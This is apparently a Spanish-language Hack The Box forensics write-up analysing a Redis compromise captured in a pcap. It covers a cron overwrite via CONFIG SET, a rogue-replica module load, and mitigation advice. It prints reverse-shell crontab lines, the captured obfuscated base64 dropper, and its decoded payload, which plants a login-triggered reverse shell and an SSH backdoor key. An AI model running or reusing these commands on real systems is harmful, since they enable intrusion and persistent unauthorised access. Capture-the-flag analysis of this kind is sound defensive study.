---
layout: single
title: Hack the box Challenge - RedTrails
excerpt: Un reto relacionado con RedisCache
date: 2025-07-12
classes: wide
header:
  teaser: ../gits/sec/blog/assets/images/ic-forensics.svg
  teaser_home_page: true
  icon: ../assets/images/hackthebox.webp
categories:
   - hack the box
   - challenge
   - root
   - redis
tags:
   - redis
   - wireshark
   - malware
   - malware
---

CHALLENGE DESCRIPTION

Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.

En este laboratorio se nos entrega un único fichero .pcap, en el que nos encontraremos con tráfico del protocolo `RESP`, que es el protocolo de comunicación que utiliza Redis, una base de datos NoSQL en memoria muy popular para almacenamiento clave-valor, cachés y sistemas de mensajería.

RESP define cómo Redis y sus clientes intercambian datos por medio de una conexión TCP, usando un formato de texto simple, estructurado por prefijos y terminadores de línea (\r\n). Es un protocolo binario seguro para análisis, y se puede leer fácilmente en capturas de red si no está cifrado.

Redis (REmote DIctionary Server) es un sistema que funciona principalmente en memoria, ofreciendo una latencia extremadamente baja. Aunque se le puede persistir en disco, está diseñado para rapidez en operaciones de tipo:

- `GET`, `SET`, `INCR`, `EXPIRE`, etc
- Soporta estructuras como listas, sets, hashes, sorted sets, pub/sub, etc.

| Tipo RESP     | Prefijo | Ejemplo                              |
| ------------- | ------- | ------------------------------------ |
| Simple string | `+`     | `+OK\r\n`                            |
| Error         | `-`     | `-Error message\r\n`                 |
| Integer       | `:`     | `:1000\r\n`                          |
| Bulk string   | `$`     | `$6\r\nfoobar\r\n`                   |
| Array         | `*`     | `*2\r\n$3\r\nGET\r\n$5\r\nclave\r\n` |

Ejemplo de comando RESP (GET clave)

```pgsql
*2
$3
GET
$5
clave
```
Cada línea termina en \r\n. Esto sería lo que verías en crudo en una captura con Wireshark o tcpdump, si Redis no usa TLS.

**Seguridad y RESP** 

- RESP no tiene autenticación por defecto (salvo que Redis esté configurado con una clave requirepass).
- No usa cifrado, salvo que Redis se compile con soporte TLS o se enrute a través de túneles (ej. stunnel, SSH, VPN).
- En redes corporativas o ambientes de pruebas, puede exponerse información sensible si RESP se transmite en texto plano.

Así que podemos dar un seguimiento a la captura pcap con thsark: 

```bash 
┌──(kali㉿kali)-[~/challenges/red/network]
└─$ tshark -r capture.pcap -Y "_ws.col.protocol == RESP"
    4   0.000260   10.10.0.15 38342 10.10.0.90   6379 RESP 97 Request: AUTH 1943567864
    6   0.000596   10.10.0.90 6379 10.10.0.15   38342 RESP 71 Response: OK
    8   0.000770   10.10.0.15 38342 10.10.0.90   6379 RESP 93 Request: COMMAND DOCS
    <SNIP>
```

Un resumen de lo que podremos ver en la salida, que es una variante del ataque **Redis "module backdoor"**, uno de los métodos de explotación más comunes cuando Redis está mal configurado:

## 1. Autenticación inicial

```
4   … Request:  AUTH 1943567864  
6   … Response: OK  
```

Redis requiere autenticación (si está configurada). En este caso se envía `AUTH 1943567864` y el servidor responde `OK`.

> **Concepto clave**: Redis protege acceso remoto mediante contraseña si en `redis.conf` está habilitado `requirepass`.

## 2. Enumeración de comandos y datos

```
8   … Request:  COMMAND DOCS  
9–25… Response: Array(482) [continuation]  
27  … Request:  INFO  
28  … Response: BulkString(5295)  
30  … Request:  KEYS *  
31  … Response: Array(1)  
32  … Request:  TYPE users_table  
33  … Response: hash  
34  … Request:  HGETALL users_table  
35  … Response: Array(40)  
```

Aquí el cliente pide:

1. **COMMAND DOCS**: lista completa de comandos y sus descripciones.
2. **INFO**: información del servidor (versiones, directorios, configuración, estadísticas).
3. **KEYS \***: todas las claves actuales (`users_table` en este caso).
4. **TYPE** y **HGETALL**: distingue el tipo de dato (hash) y obtiene todos sus campos y valores.

> **Ejemplo**: con `HGETALL users_table` obtienes, por ejemplo, `username → admin`, `password_hash → …`, etc.

## 3. Preparación de escritura arbitraria de ficheros

```
36  … Request:  CONFIG SET DIR /var/spool/cron  
37  … Response: OK  
38  … Request:  CONFIG SET DBFILENAME root  
39  … Response: OK  
40  … Request:  SET TY1RI8 <103 bytes>  
41  … Response: OK  
42  … Request:  SET EJHIPI <110 bytes>  
43  … Response: OK  
44  … Request:  SET MBW89Y <112 bytes>  
45  … Response: OK  
46  … Request:  SAVE  
48  … Response: OK  
```

Aquí el atacante: 

1. Cambia el directorio de persistencia (`DIR`) a `/var/spool/cron` (donde están los cron jobs de usuarios).
2. Cambia el nombre de fichero de volcado (`DBFILENAME`) a `root` (para sobrescribir el cron de root).
3. Con varios `SET` introduce en la base de datos cadenas que, al guardarse en formato RDB, formarán líneas crontab válidas (por ejemplo:

   ```
   * * * * * root bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
   ```
4. Con `SAVE` fuerza a Redis a volcar la “base de datos” en `/var/spool/cron/root`. De este modo, cuando cron lea ese fichero, ejecutará el payload como root.

> **Ejemplo de cron malicioso**:
>
> ```
> * * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"  
> ```

---

## 4. Establecimiento de réplica y carga de módulo

Después de escribir el cron, el atacante procede a cargar un módulo malicioso para ejecución inmediata:

```
72–74… AUTH … OK  
76  … SLAVEOF 10.10.0.15 6379  
79  … OK  
80  … CONFIG SET DIR /data  
81  … OK  
82  … CONFIG SET dbfilename x10SPFHN.so  
83  … OK  
…  
96  … REPLCONF capa eof capa psync2  
100 … PSYNC …  
101–110… FULLRESYNC … BulkString(58928)  
119 … MODULE LOAD ./x10SPFHN.so  
120 … OK  
122 … SLAVEOF NO ONE  
124 … OK  
```

**Pasos clave**:

1. **SLAVEOF**: convierte al servidor original en esclavo de una instancia controlada por el atacante (10.10.0.15).
2. **REPLCONF/PSYNC/FULLRESYNC**: sincronización de snapshot RDB (aquí degranando el módulo `.so`).
3. Tras recibir el `.so` malicioso en el volcado, se invoca `MODULE LOAD`, obteniendo ejecución de código en memoria.
4. Por último, `SLAVEOF NO ONE` convierte de nuevo al servidor en maestro, manteniendo el módulo cargado.

## 5. Limpieza y ejecución de comandos finales

```
127 … system.exec rm -v ./x10SPFHN.so  
128 … Response: <hash>  
131 … system.exec uname -a  
132 … Response: BulkString(224)  
134 … system.exec <otro comando>  
153 … Response: BulkString(960)  
155 … MODULE UNLOAD system  
157 … OK  
```

Con `MODULE UNLOAD` y `system.exec` (disponible tras cargar el módulo) el atacante:

* Ejecuta comandos arbitrarios (`uname -a`, etc.).
* Limpia artefactos (`rm ./x10SPFHN.so`).
* Descarga, ejecuta o desinstala lo que necesite.

------

Bien, aquí ya sabemos que se leyeron usuarios del sistema, así que podemos buscar la información envíada, ya que ésta es bastante atractiva para un usuario, y efectivamente, aquí encontramos una parte de la flag: 

![](../assets/images/htb-redtrail/1.png)

La primera parte de la flag la encontramos en el unico fichero que aparece en los objetos de http, que a su vez está en el stream número 2. 

```bash 
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==gCHFjNyEDT5AnZFJmR4wEaKoQfKIDRJRmNUJWd2JGMHt0N4lgC2tmZGFkYpd1a1hlVKhGbJowegkCKHFjNyEDT5AnZFJmR4wEaKoQfKg2chJGI8BSZk92YlRWLtACN2U2chJGI8BiIwFDeJBFJUxkSwNEJOB1TxZEJzdWQwhGJjtUOEZGJBZjaKhEJuFmSZdEJwV3N5EHJrhkerJGJpdjUWdGJXJWZRxEJiAyboNWZJogI90zdjJSPwFDeJBVCKISNWJTYmJ1VaZDbtNmdodEZxYkMM9mTzMWd4kmZnRjaQdWST5keN1mYwMGVOVnR6hVMFRkW6l0MlNkUGNVOwoHZppESkpEcFVGNnZUTpZFSjJVNrVmRWV0YLZleiJkUwk1cGR1TyMXbNJSPUxkSwNUCKIydJJTVMR2VRlmWERGe5MkYXp1RNNjTVVWSWxmWPhGRNJkRVFlUSd0UaZVRTlnVtJVeBRUYNxWbONzaXdVeKh0UwQmRSNkQ61EWG5WT4pVbNRTOtp1VGpXTGlDMihUNFVWaGpWTH5UblJSPOB1TxZUCKICcoZ1YDRGMZdkRuRmdChlVzg3ViJTUyMlW1U0U1gzQT5EaYNlVW5GV2pUbT9Ebt1URGBDVwZ0RlRFeXNlcFd1TZxmbRpXUuJ2c5cFZaRmaXZXVEpFdWZVYqlDMOJnVrVWWoVEZ6VkeTJSPzdWQwhWCKIyMzJjTaxmbVVDMVF2dvFTVuFDMR9GbxoVeRdEZhBXbORDdp5kQ01WVxYFVhRHewola0tmTpJFWjFjWupFUxs2UxplVX1GcFVGboZFZ4BTbZBFbEpFc4JzUyRTbSl3YFVWMFV1UHZ0MSJSPjtUOEZWCKIicSJzY6RmVjNFd5F1QShFV2NXRVBnTUZVU1ckUCRWRPpFaxIlcG1mT0IkbWxkVu5EUsZEVy5EWOxkWwYVMZdkY5ZVVTxEbwQ2MnVUTR5EMLZXWVV2MWJTYvxWMMZXTsNlNS5WUNRGWVJSPBZjaKhUCKIySSZVWhplVXVTTUVGckd0V0x2VWtWMHVWSWx2Y2AnMkd3YFZFUkd0TZZ0aR9mVW50dWtWUyhmbkdXSGVWe4IjTQpkaOplTIFmWSVkTDZEVl9kRsJldRVFVNp1VTJXRX9UWs5WU6FlbiJSPuFmSZdUCKIyc5cFZaRmaXZXVEpFdWZVYqlDMOJnVrVWWoVEZ6VkeTNzcy4kWs5WV1ATVhd3bxUlbxATUvxWMalXUHRWYw1mT0QXaOJEdtV1cs5WUzh3aNlXUsZVRkh0VIRnMiJUOyM1U0dkTsR2ajJSPwV3N5EXCKICSoR0Y3dGSVhUOrFVSWREVoJERllnUXJlS0tWV3hzVOZkS6xkdzdUTMZkMTpnRyQFMkV0T6lTRaNFczoFTGFjYyk0RWpkStZVeZtWW3FEShBzZq1UWSpHTyVERVVnUGVWbOd1UNZkbiJSPrhkerJWCKIiM1UlV5plbUh3bx4kbkdkV0ZlbSZDaHdVU502YZR3aWBTMXJle1UEZIRHMMJzYtNVNFhVZ6BnVjJkWtJmdOhUThZFWRJjWtFVNwtmVpBHMNlmTFJGb0lWUsZFbZlmVU1USoh0VXBXMNJSPpdjUWdWCKICTWVFZaVTbOpWNrdVdCFzS4BHbNRjRwEGaxAzUVZlVPhHdtZFNNVVVC5UVRJkRrFlQGZVUFZUVRJkRVJVeNdVZ41UVZZTNw00QGVVUCZURJhmTuNGdnJzY6VzRYlWQTpFdBlnYv50VaJSPXJWZRxUCKsHIpgiMElEZ2QlY1ZnYwc0S3gnCK0nCoNXYiBCfgUGZvNWZk1SLgQjNlNXYiBCfgICW4lUUnRCSqB1TRRieuZnQBRiIg8GajVGIgACIKcySJhlWrZ0Va9WMD10d4MkW1F1RkZXMXxEbShVWrJEWkZXTHRGbn0DW4lUUnlgCnkzQJtSQ5pUaFpmSrEERJNTT61Ee4MUT3lkaMdHND1Ee0MUT4hzQjp2J9gkaQ9UUJowJSNDTyY1RaZXQpp0KBNVY0F0QhpnRtlVaBlXW0F0QhpnRtllbBlnYv50VadSP65mdCFUCKsHIpgidrZmRBJWaXtWdYZlSoxmCKg2chJ2LulmYvEyI
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

Así que podemos desofucar esto con `echo "<base64 string>" | rev | base64 -d`. Encontramos otro código ofuscado, modificándolo para que sea seguro y ejecutándolo encontramos lo siguiente: 

```bash
┌──(kali㉿kali)-[~/challenges/red]
└─$ ./first.sh
A
echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header
echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==HTB{r3d15_1n574nc35" >> ~/.ssh/authorized_keys
```

- En muchas distribuciones Debian/Ubuntu, los scripts en /etc/update-motd.d/ se ejecutan automáticamente cada vez que un usuario se conecta por SSH y generan el mensaje del día (MOTD). El fichero 00-header es normalmente el primero en ejecutarse y suele contener la cabecera informativa.

- Con echo `'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header ` se está sobrescribiendo 00-header con un script que, cuando se ejecute, lanzará un reverse shell hacia (10.10.0.200, puerto 1337). Cada vez que alguien inicie sesión, ese script se ejecutará y se recibirá la conexión inversa.

```bash 
#!/usr/bin/env python
A

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import binascii

A
# Your hex ciphertext

ciphertext_hex = "adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f"
ciphertext = binascii.unhexlify(ciphertext_hex)

# Key and IV
key = b"h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz" #32 bytes
iv = b"YDP7ECjzuV7sagMN" #16 bytes

# Decrypt
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
decryptor = cipher.decryptor()
plaintext = decryptor.update(ciphertext) + decryptor.finalize()

# Handle padding (PKCS#5/PKCS#7)
padding_len = plaintext[-1]
plaintext = plaintext[:-padding_len]

print(plaintext.decode('utf-8'))
```

## ¿Cómo mitigar esto?

* Verificar si Redis está **escuchando en interfaces públicas** (`bind 0.0.0.0`) en el archivo de configuración (`redis.conf`).
* Asegurarse que Redis tenga:

  * Autenticación fuerte (`requirepass`)
  * Desactivado el comando `CONFIG` o restringido mediante `rename-command`
  * Cargado con `protected-mode yes`
* Inspeccionar si hay **módulos cargados inesperadamente** (`MODULE LIST`).
* Buscar archivos `.so`, `root`, o `cron` en `/var/spool/cron` o `/data`.

